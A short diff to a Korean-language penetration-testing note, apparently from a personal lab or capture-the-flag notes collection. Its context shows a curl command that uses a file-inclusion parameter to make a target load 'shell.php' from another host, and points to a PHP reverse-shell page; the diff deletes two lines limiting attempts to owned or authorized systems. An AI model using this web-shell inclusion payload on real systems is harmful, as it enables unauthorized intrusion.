@@ -35,8 +35,6 @@ curl "http://target/upload/?file=http://127.0.0.1:8000/shell.php"
 ```
 
 - 이 시연은 [php_pipe](../../shells/reverse-shell/php_pipe.md) 문서를 참고한다.
-- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
 
 ## 참고 / 증적
 - 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
-- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
